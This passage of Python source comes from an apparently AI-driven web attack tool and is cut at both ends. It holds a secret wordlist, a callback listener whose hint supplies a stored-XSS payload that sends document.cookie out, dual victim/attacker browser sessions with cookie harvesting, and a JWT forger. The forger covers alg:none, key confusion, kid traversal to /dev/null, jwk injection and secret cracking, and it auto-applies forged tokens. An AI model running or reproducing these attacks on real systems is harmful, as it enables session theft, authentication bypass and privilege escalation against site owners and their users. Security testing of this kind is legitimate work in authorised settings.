    "jwtsecret", "jwt_secret", "jwt-secret", "jwt-secret-key", "supersecret", "super-secret",
    "changeme", "change-me", "password", "Password1", "123456", "admin", "test", "testing",
    "qwerty", "letmein", "topsecret", "top-secret", "key", "private", "privatekey",
    "mysecretkey", "s3cr3t", "verysecret", "very-secret-key", "shhhh", "shh",
    "flag", "ctf", "hackthebox", "tryhackme", "thm", "htb", "development", "dev",
    "production", "prod", "prod_secret", "backend_secret", "api_secret", "api-secret",
    "auth_secret", "session_secret", "signing_key", "signingkey", "hmac_secret",
    "null", "undefined", "none", "0", "1", "abc123", "letmein123", "welcome",
    "django-insecure", "insecure", "not-a-secret", "some-secret", "webtoken",
    "webtokensecret", "jsonwebtoken", "jwtkey", "jwt.io", "keyboard cat",
    "your-secret", "myapp_secret", "app_secret", "app-secret", "flask-secret-key",
    "express-secret", "node_secret", "", "0" * 32, "0" * 64,
)


def _execute_listener(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Start or poll a local out-of-band (OOB) HTTP listener, for confirming
    blind or stored vulns where there's no direct response leakage to check
    against — e.g. stored/blind XSS exfiltrating document.cookie via
    fetch(), blind SSRF, blind SQLi/XXE. Previously this listener
    (oob_utils.OOBServer) existed fully working but was never wired into
    the tool registry, so there was no way to actually spin one up.
    """
    from hellhound.core.oob_utils import get_or_create_oob_server

    action = (args.get("action") or "start").lower()
    srv = get_or_create_oob_server(target.name)

    if action == "start":
        host, port = srv.start()
        if not host:
            return {"status": "error", "error": "Could not bind a local listener port (8000-9000 all appear in use)."}
        url = srv.get_url()
        return {
            "status": "success",
            "listener_url": url,
            "hint": (
                f"Listener is live at {url} and will stay up for the rest of this "
                f"session. Embed it in the payload so the target calls back to it — "
                f"e.g. for stored XSS cookie theft: "
                f"<script>fetch('{url}/c?x='+document.cookie)</script>. Put a unique "
                f"random token in the callback path or query string so a later "
                f"poll can match the hit to this specific payload instead of any "
                f"unrelated noise (e.g. '{url}/c?tok=<random>&x='+document.cookie)."
            )
        }

    if action == "poll":
        token = str(args.get("token", "")).strip()
        # Cap was already raised to 300s (see comment above) so an explicit
        # long wait is respected — but the DEFAULT when no timeout is given
        # was still 10s, and in practice the model kept calling poll with no
        # explicit timeout (or small ones) and giving up after ~60s total
        # despite the xss skill itself warning that reviewed/blind payloads
        # can take much longer than that. Raised the default so a plain
        # poll(token=...) call — the common case — gets real coverage
        # instead of quitting almost immediately.
        timeout = max(1, min(int(args.get("timeout", 45) or 45), 300))
        if not token:
            return {
                "status": "error",
                "error": "poll requires 'token' — the unique string embedded in the payload's callback URL, used to match hits."
            }
        if not srv.host:
            return {"status": "error", "error": "No listener is running yet for this target. Call action='start' first."}
        got_hit, raw = srv.poll(token, timeout=timeout)
        if got_hit:
            return {"status": "success", "hit": True, "data": raw}
        return {"status": "success", "hit": False, "note": f"No callback received containing '{token}' within {timeout}s (this poll call actually waited the full requested {timeout}s). Past hits are never discarded — a later poll (even a short one) will still catch a delayed callback, so re-polling after a longer gap works too. If still nothing after a genuinely long wait, the payload likely isn't firing at all (sanitized, not rendered, or no reviewer ever visits the content) rather than just needing more time."}

    if action == "stop":
        srv.stop()
        return {"status": "success", "stopped": True}

    return {"status": "error", "error": f"Unknown action '{action}'. Use 'start', 'poll', or 'stop'."}


def _execute_browser_control(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Generic interactive browser control, backed by a PERSISTENT per-target
    Playwright page (hellhound.core.browser_control) — unlike spider/gowitness,
    which launch-and-tear-down a browser inside one module.run() call, this
    tool's page stays alive ACROSS separate tool calls within the session, so
    a multi-step flow (goto a login page, fill credentials, click submit,
    then poke at the now-authenticated page) can be driven one action at a
    time, each action its own tool call the model can reason about in
    between.

    MULTIPLE INDEPENDENT SESSIONS: pass a `session` name (e.g. "victim",
    "attacker") to get its own isolated browser CONTEXT — own cookie jar,
    own storage, own page — instead of the single shared "default" one.
    This is what real cross-user IDOR/BAC testing needs: log in as user A
    in one session, user B in another, both still open and interactive at
    the same time, instead of a second login destroying the first user's
    session in a shared context. Omit `session` (or use "default") for
    ordinary single-session flows — nothing changes there.
    """
    from hellhound.core import browser_control

    action = (args.get("action") or "").strip().lower()
    if not action:
        return {
            "status": "error",
            "error": (
                "browser_control requires an 'action': goto, click, fill, eval_js, get_storage, get_cookies, "
                "get_network_log, screenshot, close, list_sessions (which sessions are open for this target), "
                "or close_all (tear down every session for this target at once)."
            ),
        }

    target_prefix = target.name if (target and target.name) else "default"
    session_id = (args.get("session") or args.get("session_id") or "default").strip() or "default"

    if action == "list_sessions":
        return browser_control.list_sessions(target_prefix)

    if action in ("close_all", "close_all_sessions"):
        return browser_control.close_all_sessions(target_prefix)

    key = f"{target_prefix}::{session_id}"
    result = browser_control.run_browser_action(key, action, args)
    if isinstance(result, dict):
        result["session"] = session_id

    # Mirror curl's behavior: whatever cookies the browser is holding after
    # this action get folded into target.state, so curl/other tools (and a
    # later browser_control call) can reuse a session the browser itself
    # established (e.g. after a JS-driven login redirect curl can't follow).
    # Deliberately scoped to the "default" session only — syncing a NAMED
    # second session's cookies (e.g. "attacker") into target.state would
    # silently clobber the primary session every other tool (curl,
    # fuzz_hunter, sqlmap_scan...) reuses, defeating the point of having
    # two independent identities open at once.
    if (
        session_id == "default"
        and result.get("status") == "success"
        and action in ("goto", "click", "fill", "get_cookies")
        and hasattr(target, "state") and isinstance(target.state, dict)
    ):
        try:
            cookie_result = browser_control.run_browser_action(key, "get_cookies", {}, timeout=15)
            cookies = cookie_result.get("cookies") if cookie_result.get("status") == "success" else None
            if cookies:
                if "cookies" not in target.state or not isinstance(target.state["cookies"], dict):
                    target.state["cookies"] = {}
                for c in cookies:
                    cname, cval = c.get("name"), c.get("value")
                    if not cname or cval is None:
                        continue
                    target.state["cookies"][cname] = cval
                    if any(x in cname.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                        target.state["session_cookie"] = f"{cname}={cval}"
                save_target(target)
        except Exception:
            pass  # cookie sync is best-effort and must never break the actual browser action

    return result


# Cookie/value names that are well-known opaque server-side session
# identifiers — carry no embedded payload at all, so even naming them here
# is purely for a clearer "well_known_type" note in cookie_inspector's
# output, never the deciding factor (the dot-count/header-decode check
# below is what actually decides jwt_candidate vs opaque).
_WELL_KNOWN_OPAQUE_SESSION_NAMES = (
    "phpsessid", "jsessionid", "connect.sid", "asp.net_sessionid", "aspsessionid",
    "laravel_session", "ci_session", "sessionid", "session_id", "sid", "remember_token",
    "csrftoken", "csrf_token", "xsrf-token", "x-xsrf-token", "_ga", "_gid",
)


def _b64url_decode_json_safe(segment: str) -> Optional[Dict[str, Any]]:
    """Best-effort base64url-decode a single dot-separated segment and parse
    it as JSON. Returns None (never raises) if it isn't decodable JSON —
    used only for classification, not for anything that needs to trust the
    content."""
    try:
        s = segment.replace("-", "+").replace("_", "/")
        s += "=" * ((4 - len(s) % 4) % 4)
        decoded = base64.b64decode(s)
        parsed = json.loads(decoded)
        return parsed if isinstance(parsed, dict) else None
    except Exception:
        return None


def _classify_cookie_value(name: str, value: Any) -> Dict[str, Any]:
    """
    Classifies a single cookie/header value so the caller can decide whether
    jwt_forge is even worth invoking on it, WITHOUT spending a jwt_forge call
    to find out. This mechanizes the rule jwt_forge's own description
    already states in prose (zero dots -> not a JWT, don't call it) so it
    doesn't depend on the model reading and following that prose every time.

    Three outcomes:
      - "jwt_candidate": dot-separated AND the first segment decodes to a
        JSON object containing a JWT-shaped header key (alg/typ). Worth
        calling jwt_forge for real forgery attempts.
      - "dot_separated_non_jwt": has at least one '.' but the first segment
        doesn't decode as a JWT header — e.g. a Flask/itsdangerous signed
        session blob. jwt_forge can STILL be called on these (it decodes
        and returns session content instead of forging claims) but it will
        never produce a forged-privilege token, so this is a lower-priority
        call than jwt_candidate, not a hard "never call" like opaque below.
      - "opaque_session_id": zero dots at all — PHPSESSID, connect.sid,
        a plain hex/UUID session id, an opaque bearer token. jwt_forge is
        guaranteed to reject these outright; do not call it on these.
    """
    if not isinstance(value, str) or not value.strip():
        return {"name": name, "classification": "empty", "reason": "no value to classify"}

    value = value.strip()
    well_known = next((n for n in _WELL_KNOWN_OPAQUE_SESSION_NAMES if n == str(name).lower()), None)

    dots = value.count(".")
    if dots < 1:
        return {
            "name": name,
            "classification": "opaque_session_id",
            "well_known_type": well_known,
            "reason": "no '.' separators — not JWT-shaped at all; jwt_forge would reject this outright.",
            "call_jwt_forge": False,
        }

    header_json = _b64url_decode_json_safe(value.split(".", 1)[0])
    if header_json and ("alg" in header_json or "typ" in header_json):
        return {
            "name": name,
            "classification": "jwt_candidate",
            "decoded_header": header_json,
            "reason": "dot-separated and the header segment decodes to a JSON object with alg/typ — a real JWT.",
            "call_jwt_forge": True,
        }

    return {
        "name": name,
        "classification": "dot_separated_non_jwt",
        "well_known_type": well_known,
        "reason": (
            "has dot-separated segments but the header doesn't decode as a JWT header — likely a "
            "framework-signed session cookie (e.g. Flask itsdangerous), not a real JWT. jwt_forge "
            "can still decode this for session content, but forgery/privilege-escalation techniques "
            "will not apply — do not expect alg:none/kid/jwk tricks to work on this one."
        ),
        "call_jwt_forge": "optional",
    }


def _execute_cookie_inspector(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Classify every cookie you're holding BEFORE deciding whether to call
    jwt_forge on any of them. Fixes the recurring noisy-call pattern: any
    time a Set-Cookie/cookie shows up, reflexively calling jwt_forge on it
    regardless of shape — which just burns a turn on a guaranteed
    'not a valid JWT' error for the common case (PHPSESSID, connect.sid,
    JSESSIONID, a plain opaque session id). This tool costs nothing (no
    network call, pure local classification) and tells you definitively
    which cookies are worth sending to jwt_forge and which aren't.

    Reads cookies from (in order of preference): the 'cookies' arg if
    given (dict of name->value, or a raw 'name=value; name2=value2' Cookie
    header string), otherwise whatever's already been observed for this
    target in target.state['cookies'].
    """
    raw_input = args.get("cookies")
    pairs: Dict[str, str] = {}

    if isinstance(raw_input, dict):
        pairs = {str(k): str(v) for k, v in raw_input.items()}
    elif isinstance(raw_input, str) and raw_input.strip():
        for part in raw_input.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                if k.strip():
                    pairs[k.strip()] = v.strip()
    elif isinstance(raw_input, list):
        for item in raw_input:
            if isinstance(item, dict) and item.get("name"):
                pairs[str(item["name"])] = str(item.get("value", ""))

    source = "args"
    if not pairs:
        source = "target.state['cookies']"
        if hasattr(target, "state") and isinstance(target.state, dict):
            stored = target.state.get("cookies")
            if isinstance(stored, dict):
                pairs = {str(k): str(v) for k, v in stored.items()}

    if not pairs:
        return {
            "status": "no_cookies",
            "note": "No cookies given and none observed yet for this target (target.state['cookies'] is empty). "
                    "Make a request first (curl/spider) so cookies are captured, or pass them explicitly.",
        }

    results = [_classify_cookie_value(name, value) for name, value in pairs.items()]
    jwt_candidates = [r["name"] for r in results if r["classification"] == "jwt_candidate"]
    worth_trying = [r["name"] for r in results if r["classification"] == "dot_separated_non_jwt"]
    skip = [r["name"] for r in results if r["classification"] == "opaque_session_id"]

    if emit and hasattr(emit, "info"):
        emit.info(
            f"[*] cookie_inspector: {len(jwt_candidates)} JWT candidate(s), "
            f"{len(worth_trying)} dot-separated-but-not-JWT, {len(skip)} opaque (skip jwt_forge)."
        )

    return {
        "status": "success",
        "source": source,
        "cookies": results,
        "jwt_candidates": jwt_candidates,
        "worth_trying_jwt_forge": worth_trying,
        "skip_jwt_forge_for": skip,
        "recommendation": (
            f"Call jwt_forge on: {', '.join(jwt_candidates)}." if jwt_candidates else
            f"No confirmed JWTs. {('Optionally try jwt_forge on ' + ', '.join(worth_trying) + ' for session content.') if worth_trying else 'Do not call jwt_forge — all cookies are opaque session identifiers. Look at mass assignment, IDOR, or business-logic flaws on the session instead.'}"
        ),
    }


def _execute_jwt_forge(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Decode and forge JWTs for privilege escalation and auth bypass testing.
    Also safely handles the common false-friend case: a dot-separated,
    base64url-looking cookie (e.g. Flask's default 'session' cookie) that
    LOOKS like a JWT but is actually a framework-signed session blob with
    no claims structure. That case still gets fully decoded and returned
    via 'decoded_session_content' below instead of being turned away —
    only truly opaque, undecodable IDs (sess_..., connect.sid, PHPSESSID)
    are rejected outright, since those carry no embedded payload at all.
    Techniques (all run by default via algorithm='all', or select individually):
      - alg:none                unsigned-token bypass, case + trailing-dot variants
      - hs_crack                brute-forces the real HMAC secret against a built-in
                                 common-secret wordlist (or a supplied wordlist) and,
                                 on a hit, produces a *legitimately* signed forged token
      - hs256 confusion         RS256->HS256 public-key-as-HMAC-secret confusion, tried
                                 across several byte-encodings of the supplied key/secret
                                 since exact PEM formatting varies between JWT libraries
      - kid_injection           kid path-traversal to /dev/null, signed with an empty
                                 HMAC secret (classic CTF/lab trick — /dev/null reads as
                                 zero bytes, so an empty secret produces a valid signature)
      - jwk_injection           embeds a self-generated RSA public key directly in the
                                 header's `jwk` claim and self-signs with the matching
                                 private key, for servers that naively trust an inline jwk
                                 header instead of validating against a known key. Requires
                                 the `cryptography` package; skipped with a note if absent.
    """
    token = args.get("token")
    if not token and hasattr(target, "state") and isinstance(target.state, dict):
        token = target.state.get("auth_token")
        if not token and "cookies" in target.state and isinstance(target.state["cookies"], dict):
            for ck, cv in target.state["cookies"].items():
                if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
                    token = cv
                    break

    if not token:
        return {
            "status": "error",
            "error": "No JWT token provided or found in target session state.",
            "hint": "Inspect target session state. If cookies are opaque (e.g. sess_..., connect.sid, PHPSESSID), the application uses server-side sessions, NOT JWTs. Look for mass assignment, nested property injection, or business logic flaws instead."
        }

    # Terminal-result cache, keyed on the exact token string: whether a
    # value decodes as a real JWT (valid header+payload) or not is settled
    # BEFORE 'claims'/'algorithm' are ever read below, so that verdict is
    # identical no matter what claims/algorithm a later call passes. Without
    # this, the orchestrator's generic "already ran this exact tool+args"
    # dedup never fires here — varying claims/algorithm each time makes
    # every call look like a "new" attempt — and the model can burn several
    # calls re-testing a question that was already answered for good on the
    # first one. Cache the verdict per token and refuse instantly on repeats.
    #
    # Flask/itsdangerous session cookies also change on every request (the
    # flash-message payload rotates), so a NEW cookie value from the same
    # target still isn't caught by the per-token cache above — the model
    # kept re-triggering a fresh decode-and-fail cycle on every new session
    # cookie from the same target, printing a red error line in the CLI each
    # time even though the target's cookie FORMAT was already established.
    # Once we know a target uses non-JWT sessions at all, stop re-verifying
    # per-token and answer quietly (no error, no red line) instead.
    non_jwt_cache = None
    target_confirmed_non_jwt = False
    if hasattr(target, "state") and isinstance(target.state, dict):
        non_jwt_cache = target.state.setdefault("_confirmed_non_jwt_tokens", {})
        target_confirmed_non_jwt = bool(target.state.get("_target_uses_non_jwt_sessions"))

        if token in non_jwt_cache or target_confirmed_non_jwt:
            return {
                "status": "skipped",
                "note": (
                    "Already established this target's session cookies aren't JWTs — "
                    "skipping the re-check. Use decoded_session_content from the earlier "
                    "call, or work off the session directly."
                ),
                "decoded_session_content": non_jwt_cache.get(token),
            }

    # Strict check: Reject obvious placeholder strings or opaque cookies
    if "..." in token or token.startswith("sess_") or token.count(".") < 1:
        return {
            "status": "error",
            "error": f"The provided token '{token[:30]}...' is not a valid JSON Web Token (JWT). It appears to be an opaque session identifier or placeholder. JWT attacks (alg:none, algorithm confusion) only apply to dot-separated base64url JWTs.",
            "hint": "Do NOT attempt JWT forgery on opaque session cookies. Check application JavaScript and API endpoints for mass assignment (e.g. updating profile/account attributes via PATCH/PUT/POST) or IDOR."
        }


    def b64url_decode_json(s: str) -> Dict[str, Any]:
        s = s.replace("-", "+").replace("_", "/")
        s += "=" * ((4 - len(s) % 4) % 4)
        try:
            return json.loads(base64.b64decode(s).decode("utf-8", errors="ignore"))
        except Exception:
            return {}

    def b64url_decode_raw(s: str) -> bytes:
        s = s.replace("-", "+").replace("_", "/")
        s += "=" * ((4 - len(s) % 4) % 4)
        try:
            return base64.b64decode(s)
        except Exception:
            return b""

    def b64url_encode(obj: Any) -> str:
        if isinstance(obj, (dict, list)):
            raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
        elif isinstance(obj, str):
            raw = obj.encode("utf-8")
        elif isinstance(obj, bytes):
            raw = obj
        else:
            raw = bytes(obj)
        return base64.urlsafe_b64encode(raw).decode("utf-8").rstrip("=")

    def hs256_sign(hdr: Dict[str, Any], pay: Dict[str, Any], secret_bytes: bytes) -> str:
        hdr_b64 = b64url_encode(hdr)
        pay_b64 = b64url_encode(pay)
        signing_input = f"{hdr_b64}.{pay_b64}".encode("utf-8")
        sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
        return f"{hdr_b64}.{pay_b64}.{b64url_encode(sig)}"

    def try_non_jwt_session_decode(raw_segment: str):
        """
        Best-effort decode for dot-separated tokens that LOOK JWT-shaped but
        aren't — most commonly a framework-signed session cookie like
        Flask's itsdangerous sessions, which are also '.'-joined and
        base64url-encoded but carry a plain (optionally zlib-compressed)
        JSON blob with no JWT header/claims structure. Returns the decoded
        object if this reads as plausible JSON, else None.
        """
        raw = b64url_decode_raw(raw_segment)
        if not raw:
            return None
        try:
            return json.loads(raw.decode("utf-8"))
        except Exception:
            pass
        try:
            import zlib
            return json.loads(zlib.decompress(raw).decode("utf-8"))
        except Exception:
            return None

    parts = token.strip().split(".")
    if len(parts) < 2:
        return {
            "status": "error",
            "error": "Token is not a valid JWT (must have at least 2 dot-separated segments).",
            "hint": "Check if target uses opaque session cookies rather than JWTs."
        }

    header = b64url_decode_json(parts[0])
    payload = b64url_decode_json(parts[1])
    original_sig_b64 = parts[2] if len(parts) > 2 else ""

    if not header or not payload:
        # Don't just say "decode failed" — show what's actually in there.
        # Guessing claims (role/isAdmin/admin) blindly against a token that
        # was never a JWT (e.g. a Flask itsdangerous session cookie, which
        # is also dot-separated and superficially JWT-shaped) is exactly
        # what was happening before this fix: repeated forge attempts with
        # no grounding in the token's real content.
        raw_previews = []
        decoded_session_content = None
        for i, seg in enumerate(parts[:2]):
            raw_bytes = b64url_decode_raw(seg)
            if not raw_bytes:
                continue
            try:
                text_preview = raw_bytes[:200].decode("utf-8")
            except Exception:
                text_preview = repr(raw_bytes[:200])
            raw_previews.append(f"segment[{i}]: {text_preview}")
            if decoded_session_content is None:
                decoded_session_content = try_non_jwt_session_decode(seg)

        result = {
            "status": "not_a_jwt",
            "note": "Nah bro, this ain't a JWT — the segments don't even decode to valid JSON. Not going to sit here guessing claims out of thin air, so check raw_content_seen below for what's actually in there.",
            "raw_content_seen": raw_previews if raw_previews else "Segments did not even base64-decode to bytes.",
            "hint": "Do not guess/forge claims (role, isAdmin, admin, etc.) here — check raw_content_seen (and decoded_session_content, if present) for what's actually inside before assuming anything about this token. A dot-separated-but-non-JWT shape is common for framework-signed session cookies (e.g. Flask's itsdangerous sessions) carrying plain session/flash data, not auth claims — forging claims against those does nothing. If that's what this is, look for IDOR, mass assignment, or business-logic flaws instead. This is settled for this exact token — do not call jwt_forge on it again with different claims/algorithm values, that will not change anything."
        }
        if decoded_session_content is not None:
            result["decoded_session_content"] = decoded_session_content
            result["note"] = "Nah bro, it's not a JWT — just a plain signed session cookie (see decoded_session_content), no claims or role field in there for you to forge. This one's settled, don't call jwt_forge on it again."
        if non_jwt_cache is not None:
            non_jwt_cache[token] = decoded_session_content
        if hasattr(target, "state") and isinstance(target.state, dict):
            target.state["_target_uses_non_jwt_sessions"] = True
        return result

    target_claims = args.get("claims") or {"role": "admin"}
    forged_payload = dict(payload)
    forged_payload.update(target_claims)

    algo = (args.get("algorithm") or "all").lower()
    pub_or_secret = args.get("public_key_or_secret") or ""
    custom_wordlist = args.get("wordlist") or []

    forged_tokens = []
    techniques_run = []
    cracked_secret = None

    # 1. alg: none variations — case variants x with/without the trailing dot,
    # since different JWT libraries disagree on whether the empty signature
    # segment (and its trailing dot) must be present.
    if algo in ("none", "all"):
        techniques_run.append("alg_none")
        for alg_val in ("none", "None", "NONE"):
            hdr_none = dict(header)
            hdr_none["alg"] = alg_val
            hdr_b64 = b64url_encode(hdr_none)
            pay_b64 = b64url_encode(forged_payload)
            for suffix, style in ((".", "with trailing dot"), ("", "no trailing segment")):
                forged_tokens.append({
                    "type": f"alg:{alg_val}",
                    "description": f"Unsigned JWT with alg={alg_val} ({style})",
                    "token": f"{hdr_b64}.{pay_b64}{suffix}"
                })

    # 2. HS256 secret cracking — tests the ORIGINAL token's real signature
    # against a wordlist of common/default secrets. Unlike the confusion
    # attacks below, a hit here means the forged token is legitimately
    # signed with the application's actual key, not a validation-bypass
    # guess, so it will pass even a correctly-implemented verifier.
    #
    # Deliberately NOT included in the default 'all' bundle: the free
    # bypasses below (alg:none, kid_injection, jwk_injection) cost nothing
    # to try and often work on their own. Only run hs_crack explicitly
    # (algorithm='hs_crack') after testing those against the server and
    # confirming they were rejected — cracking is the escalation step, not
    # the first move.
    if algo == "hs_crack" and original_sig_b64 and header.get("alg", "").upper().startswith("HS"):
        techniques_run.append("hs_crack")
        signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
        target_sig = b64url_decode_raw(original_sig_b64)
        candidates = list(dict.fromkeys(list(custom_wordlist) + list(COMMON_JWT_SECRETS)))
        digest_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(
            header.get("alg", "HS256").upper(), hashlib.sha256
        )
        for candidate in candidates:
            if not isinstance(candidate, str):
                continue
            guess_sig = hmac.new(candidate.encode("utf-8"), signing_input, digest_fn).digest()
            if hmac.compare_digest(guess_sig, target_sig):
                cracked_secret = candidate
                forged_tok = hs256_sign(header, forged_payload, candidate.encode("utf-8"))
                forged_tokens.insert(0, {
                    "type": f"alg:{header.get('alg')} (cracked secret)",
                    "description": f"Legitimately signed with recovered secret {candidate!r} — real key, not a bypass guess.",
                    "token": forged_tok
                })
                break
        if cracked_secret is None and emit and hasattr(emit, "info"):
            emit.info(f"[*] jwt_forge: tested {len(candidates)} common secrets against the HMAC signature — no match.")

    # 3. RS256 -> HS256 algorithm confusion (if public key/secret provided).
    # Tried across several byte-encodings of the key: exact JWT libraries
    # are picky about trailing newlines / CRLF vs LF / surrounding
    # whitespace in the PEM text used as the HMAC key, so a single encoding
    # often silently fails even when the underlying key is correct.
    if algo in ("hs256", "all") and pub_or_secret:
        techniques_run.append("hs256_confusion")
        raw = pub_or_secret
        variants = {
            "as-is": raw,
            "stripped": raw.strip(),
            "stripped+trailing-newline": raw.strip() + "\n",
            "CRLF-normalized": raw.replace("\r\n", "\n"),
        }
        seen_keys = set()
        for label, variant in variants.items():
            key_bytes = variant.encode("utf-8")
            if key_bytes in seen_keys:
                continue
            seen_keys.add(key_bytes)
            hdr_hs = dict(header)
            hdr_hs["alg"] = "HS256"
            tok_hs = hs256_sign(hdr_hs, forged_payload, key_bytes)
            forged_tokens.append({
                "type": "alg:HS256 (public key confusion)",
                "description": f"HMAC-SHA256 signed using supplied key/secret, encoding: {label}",
                "token": tok_hs
            })
        # Also try the raw base64-decoded bytes in case the captured "public
        # key" was actually base64 DER rather than PEM text.
        decoded = b64url_decode_raw(raw.strip())
        if decoded and decoded not in seen_keys:
            hdr_hs = dict(header)
            hdr_hs["alg"] = "HS256"
            tok_hs = hs256_sign(hdr_hs, forged_payload, decoded)
            forged_tokens.append({
                "type": "alg:HS256 (public key confusion)",
                "description": "HMAC-SHA256 signed using base64-decoded raw key bytes",
                "token": tok_hs
            })

    # 4. kid header path traversal to /dev/null. Some backends resolve the
    # `kid` header to a file path to load the signing key; pointing it at
    # /dev/null (which reads as zero bytes) lets an attacker sign with a
    # known, empty HMAC secret.
    if algo in ("kid_injection", "all"):
        techniques_run.append("kid_injection")
        for kid_val in ("../../../../../../../../../../dev/null", "/dev/null"):
            hdr_kid = dict(header)
            hdr_kid["kid"] = kid_val
            hdr_kid["alg"] = "HS256"
            tok_kid = hs256_sign(hdr_kid, forged_payload, b"")
            forged_tokens.append({
                "type": "kid:/dev/null (empty secret)",
                "description": f"kid='{kid_val}', signed with an empty HMAC secret",
                "token": tok_kid
            })

    # 5. Embedded JWK header self-signing — generate our own RSA keypair,
    # embed the public half directly in the header's `jwk` claim, and sign
    # with the matching private key. Servers that pull the verification key
    # straight out of the token's own header (instead of a trusted key
    # store) will happily validate a token signed by the attacker.
    if algo in ("jwk_injection", "all"):
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa, padding
            from cryptography.hazmat.primitives import hashes

            techniques_run.append("jwk_injection")
            priv_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            pub_numbers = priv_key.public_key().public_numbers()

            def int_to_b64url(n: int) -> str:
                length = (n.bit_length() + 7) // 8
                return b64url_encode(n.to_bytes(length, "big"))

            jwk = {
                "kty": "RSA",
                "kid": "attacker-key",
                "use": "sig",
                "alg": "RS256",
                "n": int_to_b64url(pub_numbers.n),
                "e": int_to_b64url(pub_numbers.e),
            }
            hdr_jwk = dict(header)
            hdr_jwk["alg"] = "RS256"
            hdr_jwk["jwk"] = jwk
            hdr_b64 = b64url_encode(hdr_jwk)
            pay_b64 = b64url_encode(forged_payload)
            signing_input = f"{hdr_b64}.{pay_b64}".encode("utf-8")
            signature = priv_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
            tok_jwk = f"{hdr_b64}.{pay_b64}.{b64url_encode(signature)}"
            forged_tokens.append({
                "type": "jwk_injection (embedded RSA key)",
                "description": "Header carries an attacker-generated RSA public key in `jwk`; token is self-signed with the matching private key.",
                "token": tok_jwk
            })
        except ImportError:
            if emit and hasattr(emit, "info"):
                emit.info("[*] jwt_forge: skipping jwk_injection — `cryptography` package not installed (pip install cryptography).")

    # Prefer a legitimately-cracked token as primary; otherwise fall back to
    # the first generated variant (kept for backward-compat behavior).
    if cracked_secret is not None:
        primary_token = forged_tokens[0]["token"]
    else:
        primary_token = forged_tokens[0]["token"] if forged_tokens else token

    # Auto-update target state only if original token was a JWT
    if hasattr(target, "state") and isinstance(target.state, dict):
        target.state["auth_token"] = primary_token
        target.state["forged_token"] = primary_token
        if "headers" not in target.state or not isinstance(target.state["headers"], dict):
            target.state["headers"] = {}
        target.state["headers"]["Authorization"] = f"Bearer {primary_token}"
        if "cookies" in target.state and isinstance(target.state["cookies"], dict):
            for ck, val in list(target.state["cookies"].items()):
                # Only replace if the original cookie value was actually the JWT
                if val == token or (isinstance(val, str) and val.startswith("eyJ")):
                    target.state["cookies"][ck] = primary_token
                    target.state["session_cookie"] = f"{ck}={primary_token}"
        save_target(target)

    hs_crack_available = (
        algo != "hs_crack"
        and bool(original_sig_b64)
        and header.get("alg", "").upper().startswith("HS")
    )

    return {
        "status": "success",
        "original_header": header,
        "original_payload": payload,
        "forged_payload": forged_payload,
        "primary_token": primary_token,
        "forged_tokens": forged_tokens,
        "techniques_run": techniques_run,
        "cracked_secret": cracked_secret,
        "hs_crack_available": hs_crack_available,
        "instructions": (
            "Primary forged token has been applied to target.state. Test the free/no-secret "
            "variants first (alg:none, kid_injection, jwk_injection) against discovered protected "
            "endpoints (e.g. /console, /dashboard) with curl/gowitness — these cost nothing and "
            "often work outright. "
            + (
                "Secret brute-forcing was NOT run this call. Only escalate to it if the free "
                "variants above are rejected: re-run jwt_forge with algorithm='hs_crack' (this "
                "token is HS-signed, so cracking applies)."
                if hs_crack_available else
                "If none of these pass, check the response body for details (some apps reject "
                "alg:none but leak the real secret via other means — try other forged_tokens "
                "variants individually)."
            )
        )
    }


def _execute_spider(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    depth = args.get("depth", 2)

    engine = HellhoundEngine()
    opts = {"depth": depth, "max_pages": 50, "target": url}

    # Propagate session cookies / auth headers from args or target.state for authenticated crawling
    cookie_candidate = args.get("cookies") or args.get("cookie")
    if not cookie_candidate and hasattr(target, "state") and isinstance(target.state, dict):
        cookie_candidate = target.state.get("session_cookie") or target.state.get("cookies")
    if cookie_candidate:
        opts["cookie"] = cookie_candidate

    headers_candidate = args.get("headers")
    if not headers_candidate and hasattr(target, "state") and isinstance(target.state, dict):
        headers_candidate = target.state.get("headers")
        if not headers_candidate and target.state.get("auth_token"):
            headers_candidate = {"Authorization": f"Bearer {target.state.get('auth_token')}"}
    if headers_candidate:
        opts["headers"] = headers_candidate

    try:
        res = engine.run_single("spider", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        if intel and hasattr(target, "state"):
            target.state["spider_intel"] = intel
        endpoints = [ep.get("url") for ep in intel.get("endpoints", []) if isinstance(ep, dict) and ep.get("url")]
        if endpoints and hasattr(target, "state"):
            if "endpoints" not in target.state:
                target.state["endpoints"] = []
            for ep in endpoints:
                if ep not in target.state["endpoints"]:
                    target.state["endpoints"].append(ep)

        # Extract JS-discovered routes and parameters properly from intel
        raw_eps = intel.get("endpoints", []) if isinstance(intel, dict) else []
        js_routes = []
        parameters = []
        for ep in raw_eps:
            if isinstance(ep, dict):
                srcs = ep.get("source", [])
                if any("JS" in str(s) or "SPA" in str(s) for s in srcs):
                    u = ep.get("url")
                    if u and u not in js_routes:
                        js_routes.append(u)
                for p in ep.get("params", []):
                    if p and str(p) not in parameters:
                        parameters.append(str(p))

        # Also extract parameters from forms and js_orphan_params
        for form in intel.get("forms", []):
            if isinstance(form, dict):
                for f_field in form.get("fields", []):
                    if isinstance(f_field, dict):
                        f_name = f_field.get("name")
                        if f_name and str(f_name) not in parameters:
                            parameters.append(str(f_name))

        for file_params in (intel.get("js_orphan_params") or {}).values():
            if isinstance(file_params, list):
                for p in file_params:
                    if p and str(p) not in parameters:
                        parameters.append(str(p))
